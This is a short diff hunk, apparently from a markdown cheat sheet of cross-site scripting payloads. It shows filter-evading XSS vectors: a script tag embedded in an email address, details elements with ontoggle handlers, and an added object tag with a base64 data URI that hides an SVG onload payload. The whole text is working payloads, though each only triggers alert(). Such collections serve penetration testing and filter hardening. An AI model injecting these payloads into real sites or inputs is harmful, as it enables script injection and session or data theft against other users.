@@ -115,6 +115,9 @@ test@example(<script>alert(0)</script>).com
 ```js
 <details open id="' &quot;'"ontoggle=alert()>
 <details/open/id="&quot;"ontoggle=alert()>
+
+
+<object/data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
 ```
 ---
 ```js
